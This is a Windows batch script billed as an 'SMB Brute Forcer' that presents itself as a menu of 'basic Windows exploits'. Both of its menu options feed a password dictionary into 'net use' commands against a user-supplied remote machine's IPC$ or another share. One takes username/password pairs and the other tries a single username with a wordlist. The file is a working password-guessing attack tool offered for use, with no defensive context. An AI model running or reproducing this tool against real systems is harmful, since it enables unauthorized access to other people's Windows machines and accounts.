@ECHO OFF
REM -------------------------------
REM | SMB Brute Forcer Batch File 1.6 |
REM By MooreR
REM -------------------------------
REM
REM | Web: www.moorer-software.com |
REM -------------------------------
REM
REM | Designed for NT Based OS |
REM -------------------------------
color 0A
TITLE MooreR's SMB Brute Forcer Batch File V1.6
CLS
@ECHO OFF
ECHO.
ECHO «»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»«
ECHO ¶ ____ ¶
ECHO ¶ /'\_/`\ /\ _`\ ¶
ECHO ¶ /\ \ ___ ___ _ __ __\ \ \L\ \ ¶
ECHO ¶ \ \ \__\ \ / __`\ / __`\/\`'__\/'__`\ \ , / ¶
ECHO ¶ \ \ \_/\ \/\ \L\ \/\ \L\ \ \ \//\ __/\ \ \\ \ ¶
ECHO ¶ \ \_\\ \_\ \____/\ \____/\ \_\\ \____\\ \_\ \_\ ¶
ECHO ¶ \/_/ \/_/\/___/ \/___/ \/_/ \/____/ \/_/\/ / ¶
ECHO ¶ ¶
ECHO ¶ SMB Brute Force Batch File. ¶
ECHO ¶ ¶
ECHO ¶ ¶
ECHO ¶ ¶
ECHO ¶ Version: 1.6 ¶
ECHO ¶ Designed for WinNT/2k/XP ¶
ECHO ¶ http://www.moorer-software.com ¶
ECHO ¶ ¶
ECHO ¶ ¶
ECHO ¶ PHEER COWS! ¶
ECHO «»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»«
ECHO.
ECHO.
PAUSE
:EXPLOIT
CLS
ECHO.
ECHO Just Some Basic Windows Exploits
ECHO.
ECHO 1) Brute force SMB Sessions Method1
ECHO 2) Brute force SMB Sessions Method2
ECHO.
SET /P ans=%1
IF "%ans%"=="1" GOTO SMB
IF "%ans%"=="2" GOTO SMB1
REM ----------------------------------
REM ----------------------------------
:SMB1
CLS
ECHO.
ECHO SMB Brute Force (My customized Version)
ECHO.
ECHO This one is a lot better than hacking exposed windows 2000
ECHO You may now use a simple dictionary instead of creating one
ECHO with the username and then tab and then pass.
ECHO.
set /p machine=Enter IP/Machine Name:
set /p username=Enter Username To Brute:
set /p loca=Enter Location Of Dictionary:
set /p share=Enter Share (default: IPC$):
ECHO.
for /F %%i in (%loca%) do net use \\%machine%\%share% %%i /u:%username%
ECHO.
ECHO Attempting to brute....
EChO.
PAUSE
GOTO EXPLOIT
REM ----------------------------------
REM ----------------------------------
:SMB
CLS
ECHO.
ECHO SMB Brute Force (From Hacking Exposed Windows 20000)
ECHO.
ECHO You must make a dictionary file with the format below:
ECHO.
ECHO Username {tab} Pass {enter} and so forth..
ECHO.
ECHO.
set /p list=Choose Location Usernmae/Pass List:
set /p machine=Remote Machine/IP:
ECHO.
ECHO Starting Brute force....
ECHO.
for /F "tokens=1,2*" %%i in (%list%) do net use \\%machine%\IPC$ %%j /u:%%i
ECHO.
ECHO.
ECHO Attack Complete...
ECHO.
PAUSE
GOTO EXPLOIT

REM End Of Batch File 